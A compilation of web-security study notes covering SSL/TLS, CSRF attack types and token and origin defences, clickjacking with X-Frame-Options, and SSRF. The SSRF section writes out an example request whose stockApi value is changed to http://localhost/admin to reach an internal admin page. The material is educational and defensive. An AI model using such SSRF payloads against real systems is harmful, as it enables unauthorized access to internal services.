Because they can provide protection for many applications at once without modifying them, network layer security controls have been used frequently for securing communications, particularly over shared networks such as the Internet.  Network layer security controls provide a single solution for protecting data from all applications, as well as protecting IP information.  Nevertheless, in many cases, controls at another layer are better suited to providing protection than network layer controls.  For example, if only one or two applications need protection, a network layer control may be excessive.  Transport layer protocols such as SSL are most commonly used to provide security for communications with individual HTTP-based applications, although they are also used to provide protection for communication sessions of other types of applications such as SMTP, Point of Presence (POP), Internet Message Access Protocol (IMAP), and File Transfer Protocol (FTP).  Because all major Web browsers include support for TLS, users who wish to use Web-based applications that are protected by TLS normally do not need to install any client software or reconfigure their systems.  Newer applications of transport layer security protocols protect both HTTP and non-HTTP application communications, including client/server applications and other network traffic.  Controls at each layer offer advantages and features that controls at other layers do not.

SSL is the most commonly used transport layer security control.  Depending on how SSL is implemented and configured, it can provide any combination of the following types of protection:


- **Confidentiality.**  SSL can ensure that data cannot be read by unauthorized parties.  This is accomplished by encrypting data using a cryptographic algorithm and a secret key—a value known only to the two parties exchanging data.  The data can only be decrypted by someone who has the secret key.

- **Integrity.**  SSL can determine if data has been changed (intentionally or unintentionally) during transit.  The integrity of data can be assured by generating a message authentication code (MAC) value, which is a keyed cryptographic checksum of the data.  If the data is altered and the MAC is recalculated, the old and new MACs will differ.

- **Peer Authentication.**  Each SSL endpoint can confirm the identity of the other SSL endpoint with which it wishes to communicate, ensuring that the network traffic and data is being sent from the expected host.  SSL authentication is typically performed one-way, authenticating the server to the client, but it can be performed mutually.

- **Replay Protection.**  The same data is not delivered multiple times, and data is not delivered grossly out of order.

# CSRF

### Understanding the Attack

At its most fundamental level, CSRF is a vulnerability where an attacker forces a victim to make an HTTP request on the attacker’s behalf. It’s an attack that occurs entirely on the client’s side (e.g. web browser) where countermeasures trust that the victim is sending an application information that can be trusted. There are three components that enable the attack to occur: Improper usage of unsafe HTTP verbs, web browser cookie handling, and Cross-Site Scripting (XSS).

The HTTP specification separates verbs into two categories safe and unsafe. Safe verbs (GET, HEAD, and OPTIONS) are intended for use in read only operations. Requests that use them are designed to return information about the resource that is requested and should have no side effects on the server. Unsafe verbs (POST, PUT, PATCH, and DELETE) are intended for modification, creation, or deletion of a resource. Unfortunately, it’s possible for an HTTP verb to be ignored or it’s intended behavior to not be strictly enforced.

A major reason for incorrect verb use is due to the historically poor browser support of the HTTP specification. Up until the prevalence of XML HTTP Request (XHR), it was simply not possible to use a verb other than GET or POST without relying on specific framework and library hacks. This limitation resulted in the practical irrelevance of distinguishing between HTTP verbs. This alone is not sufficient to create the condition of CSRF but it contributes and makes protection against it significantly more difficult. The biggest factor that contributes to the vulnerability of CSRF is the handling of cookies by the browser.

HTTP was originally designed to be a stateless protocol with a single request corresponding to a single response and no state carried between requests. To support complex web applications, cookies were created as a solution to keep state between related HTTP requests. Cookies reside at the global level of the browser and are shared across instances, windows, and tabs. Users depend on web browsers to automatically transmit cookies for every request. Since cookies are accessible/modifiable in the browser and lack anti-tamper protection, the storage of state has shifted to server managed sessions. In this model, a unique identifier is generated on the server and stored in the cookie. Each browser request sends the cookie with it and the server is able to look up the identifier to determine if it is a valid session. When the session ends, the server forgets the identifier and invalidates any further requests that send it.

The issue lies in how cookies are managed by browsers. A cookie is composed of a handful of attributes, but the most important one we care about here is the Domain attribute. The intended functionality of the Domain attribute is to scope the cookie to a specific host that match the domain attribute of the cookie. This was designed as a security mechanism to avoid sensitive information, such as session identifiers, from being stolen by malicious websites where attackers could perform session fixation attacks. The flaw here is that the domain attribute does not depend on the Same Origin Policy (SOP); it simply compares the domain value of the cookie to the host in the request. This allows requests originating from a different origin to also carry along with it any cookies for that host. This is safe behavior if and only if safe and unsafe verbs are used correctly; example: a safe request (GET) should never change state but as we’ve seen correct use cannot necessarily be trusted. If you don’t know about the SOP, then you should read more about it: https://en.wikipedia.org/wiki/Same-origin_policy.

The last component to focus on is Cross-Site Scripting (XSS). XSS is the ability for attacker controlled JavaScript or HTML to be rendered in the DOM by a victim. If XSS exists in the application it’s essentially game over when it comes to stopping CSRF attacks. The main countermeasure that we’re going to discuss in this post, and most applications depend on, can be bypassed if XSS is possible.

### Performing the Attack

Now that we’re aware of the contributing factors, let’s dive deeper to understand just how CSRF works. If you haven’t set it up yet, now would be a good time to follow the instructions in the companion repository and get the examples running. Instructions for a basic setup are available in the README as well as a short walkthrough for getting started.

There are three traditional distinct types of CSRF that we’re going to cover:

- Resource inclusion
- Form-based
- XMLHttpRequest

Resource inclusion is the type that you’ll likely see in most demos or basic lessons that introduce the concept of CSRF. This type boils down to an attacker controlling the resource that is included by an HTML tag such as image, audio, video, object, script, etc. Any tag that includes a remote resource allows this if the attacker is capable of influencing the URL that is loaded. Due to the lack of origin checking with cookies, as described above, this attack does not require XSS and can be performed by any attacker controlled site or the site itself. This type is limited exclusively to GET requests, because those are the only types of requests that browsers will make for resource URLs. The main limitation of this type is that it requires improper use of safe HTTP verbs.

The second type we’ll discuss is form-based CSRF, commonly seen when safe verbs are used correctly. It is performed by the attacker creating their own form that mimics the one they want the victim to submit; it includes a snippet of JavaScript that forces the victim’s browser to submit the form. The form can consist entirely of hidden elements and the form submission should happen so quickly that the victim never actually sees it. Due to the handling of cookies, this can be hosted on any site by the attacker and the attack will succeed as long as the victim is logged in with valid cookies. A successful attack will land the victim on whatever page they would normally be taken to if the request was intentional. This method works particularly well for phishing attacks where an attacker can direct the victim to the page.

The last major type we’ll discuss is XMLHttpRequest (XHR). This is probably the least likely one to see, due to the number of requirements. Since many modern web applications rely on XHR, we’ll spend a lot of time building and implementing this particular countermeasure. XHR-based CSRF typically comes in the form of an XSS payload due to the SOP. Without Cross Origin Resource Sharing (CORS), XHR is limited to requests only to the origin which limits an attacker from hosting their own payloads. An attack payload for this type of CSRF is essentially a standard XHR that an attacker has found some way to inject into the victim’s browser DOM.

The following solution is a great simplification of an actual implementation that can be used for a real deployment. It focuses primarily on the client-side and token management. Interception and modification of requests and responses has many strange edge cases that require large amounts of specific domain knowledge about the platform it’s being performed on. There is a massive trade off in understanding platform complexity for avoiding understanding and handling the complexity of CSRF itself. Ideally the best solution would be to use a framework that provides CSRF protections built in and utilize that. Despite the disclaimer, there remain many reasons a solution like the following makes sense.

### Modern Protections

There are many cases where modifying an application to protect against CSRF isn’t possible. Either the source code isn’t available, the risk of application modification is too high, or it’s not easily done within the application’s constraints. This solution lends itself particularly well to being deployed within a RASP, WAF, reverse proxy, or load balancer, and can be used to provide protection to a single application or many all with the same configuration. This is particularly useful when the deployment platform is understood well but the applications it is being applied to aren’t. Let’s discuss the current solutions that are typically used for protecting against CSRF and how we can build them with the above requirements.

First and foremost, correct usage of safe and unsafe HTTP verbs is important. This alone is not a valid solution but it will make everything significantly easier and the next two methods depend upon it. Unfortunately, there isn’t a solution for this that can be applied after the fact. This is something that needs to be done at the time of building the application and requires design and architecture. Fortunately, most modern web frameworks have a concept of a router that enforces endpoints to be paired with an HTTP verb. In modern frameworks, requests for an endpoint with the wrong verb results in an error. If this is something that can’t be implemented for your application, we’ll discuss workarounds later.

The next protection is verifying the request’s origin. This countermeasure is designed to ensure that requests coming into the application originate from a source inside the application (or an otherwise trusted origin with CORS). Correct verb usage is important here simply because if we can assume that only state changing requests are coming from unsafe requests then we only need to validate the origin for unsafe requests. Validating the origin for safe requests is problematic due to the issues we discussed above. If this is required then one solution is to create an exclusion list of known safe URLs, such as the index and/or likely landing pages users will go to on first visit. This will protect against CSRF from external sources but allow the desired behavior of users reaching the site and remaining logged in on first visit.

This protection is not strictly necessary but it adds additional layers and is likely a solution that you’ll want to use if depending on CORS. CORS specifically makes a token implementation difficult due to the SOP and token distribution across applications. Origin verification also depends on the presence of HTTP headers which may not be present due to browser differences, browser extensions, or certain request conditions. If request headers are missing then the default option should always be to fail open and rely on a different layered solution for mitigating CSRF.

The protection works by comparing the Origin or Referer header with the Host header from the request. The Origin header is only used in certain circumstances, such as XHR, and may not be present in all requests. It is made up of the full host, including port. The Referer header is significantly more common and is the full URL of the location of the browser when the request was made. Lastly, the Host header is the browser informing the server of the host, including the port if not 80, that it wishes to communicate with. This is needed to support virtual hosts or multiple sites on a single application server. In this case we are using the the Host header as the source of truth for the comparison as we know that the Host header will correspond to the host that we want to enforce origin checking for. The Origin header is checked first and then falls back to checking the referer. The order doesn’t matter and can be swapped with no meaningful difference. Some basic parsing is required and it’s important to make sure that only the host and port are compared.

One thing you may be wondering is can the guarantee of comparing the referer be trusted given the possibility and ease of referer spoofing. There are two parts that make this not matter. The first is that the only way to spoof the referer is directly from the victim. As mentioned earlier, this is entirely a client-side attack so the victim’s browser would have to be intentionally falsifying the referer to something that would bypass this check. This is something that is unlikely to intentionally happen. The second factor is that these headers, origin and referer, cannot be set by JavaScript as they are protected and will cause an error if the attacker’s XSS payload attempts to set them. This restricts any dangerous modification of these headers to the victim’s browser and it’s probably safe to assume a user would never perform the attack on herself/himself unless it is intentional or their browser/machine is already compromised.

The third, and most commonly used, countermeasure is tokens. Tokens come in a few different varieties but just about every implementation ends up using synchronizer tokens. For a more complete understanding, you should read about “double submit” tokens and “encrypted” tokens. Double submit tokens should be usable with the following solution, though the solution discussed here is simpler, while encrypted tokens are typically less efficient due to the cost of AES or the otherwise chosen encryption scheme. Instead we’ll use a hybrid of synchronizer and encryption that provides the best of both solutions.

Synchronizer tokens work by synchronizing the server and the browser with a unique token. Requests for safe methods return a token that the browser will send up with each unsafe request, typically in the form body or request header, depending on the type of request. The server validates that the token is authentic and valid before allowing the request to continue; the server will also provide a new token so that tokens are not continually reused or open to replay attacks. This stops CSRF payloads on attacker controlled hosts due to the SOP. The attacker will be unable to get access to the token and insert it into the request because doing so would require that the attacker be able to force the victim to make a request to the remote site and access the response — exactly what the SOP is designed to stop. The only way an attacker would be able to do this is via XSS in the application.

# Clickjacking

### What is clickjacking

Clickjacking is an attack that tricks a user into clicking a webpage element which is invisible or disguised as another element. This can cause users to unwittingly download malware, visit malicious web pages, provide credentials or sensitive information, transfer money, or purchase products online.

Typically, clickjacking is performed by displaying an invisible page or HTML element, inside an iframe, on top of the page the user sees. The user believes they are clicking the visible page but in fact they are clicking an invisible element in the additional page transposed on top of it.

The invisible page could be a malicious page, or a legitimate page the user did not intend to visit – for example, a page on the user’s banking site that authorizes the transfer of money.

There are several variations of the clickjacking attack, such as:

- Likejacking – a technique in which the Facebook “Like” button is manipulated, causing users to “like” a page they actually did not intend to like.
- Cursorjacking – a UI redressing technique that changes the cursor for the position the user perceives to another position. Cursorjacking relies on vulnerabilities in Flash and the Firefox browser, which have now been fixed.

###  Clickjacking attack example

1. The attacker creates an attractive page which promises to give the user a free trip to Tahiti.
2. In the background the attacker checks if the user is logged into his banking site and if so, loads the screen that enables transfer of funds, using query parameters to insert the attacker’s bank details into the form.
3. The bank transfer page is displayed in an invisible iframe above the free gift page, with the “Confirm Transfer” button exactly aligned over the “Receive Gift” button visible to the user.
4. The user visits the page and clicks the “Book My Free Trip” button.
5. In reality the user is clicking on the invisible iframe, and has clicked the “Confirm Transfer” button. Funds are transferred to the attacker.
6. The user is redirected to a page with information about the free gift (not knowing what happened in the background).

![](https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/Clickjacking.png)

This example illustrates that, in a clickjacking attack, the malicious action (on the bank website, in this case) cannot be traced back to the attacker because the user performed it while being legitimately signed into their own account.

### Clickjacking mitigation

There are two general ways to defend against clickjacking:

- Client-side methods – the most common is called Frame Busting. Client-side methods can be effective in some cases, but are considered not to be a best practice, because they can be easily bypassed.
- Server-side methods – the most common is X-Frame-Options. Server-side methods are recommended by security experts as an effective way to defend against clickjacking.

### Mitigating clickjacking with X-Frame-Options response header

The X-Frame-Options response header is passed as part of the HTTP response of a web page, indicating whether or not a browser should be allowed to render a page inside a ```<FRAME>``` or ```<IFRAME>``` tag.

There are three values allowed for the X-Frame-Options header:

- DENY – does not allow any domain to display this page within a frame
- SAMEORIGIN – allows the current page to be displayed in a frame on another page, but only within the current domain
- ALLOW-FROM URI – allows the current page to be displayed in a frame, but only in a specific URI – for example www.example.com/frame-page

#### Using the SAMEORIGIN option to defend against clickjacking

X-Frame-Options allows content publishers to prevent their own content from being used in an invisible frame by attackers.

The DENY option is the most secure, preventing any use of the current page in a frame. More commonly, SAMEORIGIN is used, as it does enable the use of frames, but limits them to the current domain.

#### Limitations of X-Frame-Options

- To enable the SAMEORIGIN option across a website, the X-Frame-Options header needs to be returned as part of the HTTP response for each individual page (cannot be applied cross-site).
- X-Frame-Options does not support a whitelist of allowed domains, so it doesn’t work with multi-domain sites that need to display framed content between them.
- Only one option can be used on a single page, so, for example, it is not possible for the same page to be displayed as a frame both on the current website and an external site.
- The ALLOW-FROM option is not supported by all browsers.
- X-Frame-Options is a deprecated option in most browsers.

# Server-side request forgery (SSRF)

### What is SSRF?

Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.

In typical SSRF examples, the attacker might cause the server to make a connection back to itself, or to other web-based services within the organization's infrastructure, or to external third-party systems. 

### What is the impact of SSRF attacks?

A successful SSRF attack can often result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems that the application can communicate with. In some situations, the SSRF vulnerability might allow an attacker to perform arbitrary command execution.

An SSRF exploit that causes connections to external third-party systems might result in malicious onward attacks that appear to originate from the organization hosting the vulnerable application, leading to potential legal liabilities and reputational damage. 

### Common SSRF attacks

SSRF attacks often exploit trust relationships to escalate an attack from the vulnerable application and perform unauthorized actions. These trust relationships might exist in relation to the server itself, or in relation to other back-end systems within the same organization. 

### SSRF attacks against the server itself

In an SSRF attack against the server itself, the attacker induces the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface. This will typically involve supplying a URL with a hostname like ```127.0.0.1``` (a reserved IP address that points to the loopback adapter) or ```localhost``` (a commonly used name for the same adapter).

For example, consider a shopping application that lets the user view whether an item is in stock in a particular store. To provide the stock information, the application must query various back-end REST APIs, dependent on the product and store in question. The function is implemented by passing the URL to the relevant back-end API endpoint via a front-end HTTP request. So when a user views the stock status for an item, their browser makes a request like this: 

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1 
```

This causes the server to make a request to the specified URL, retrieve the stock status, and return this to the user.

In this situation, an attacker can modify the request to specify a URL local to the server itself. For example: 

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin 
```

Here, the server will fetch the contents of the ```/admin``` URL and return it to the user.

Now of course, the attacker could just visit the ```/admin``` URL directly. But the administrative functionality is ordinarily accessible only to suitable authenticated users. So an attacker who simply visits the URL directly won't see anything of interest. However, when the request to the ```/admin``` URL comes from the local machine itself, the normal access controls are bypassed. The application grants full access to the administrative functionality, because the request appears to originate from a trusted location. 

Why do applications behave in this way, and implicitly trust requests that come from the local machine? This can arise for various reasons:

- The access control check might be implemented in a different component that sits in front of the application server. When a connection is made back to the server itself, the check is bypassed.
- For disaster recovery purposes, the application might allow administrative access without logging in, to any user coming from the local machine. This provides a way for an administrator to recover the system in the event they lose their credentials. The assumption here is that only a fully trusted user would be coming directly from the server itself.
- The administrative interface might be listening on a different port number than the main application, and so might not be reachable directly by users.

These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, is often what makes SSRF into a critical vulnerability. 
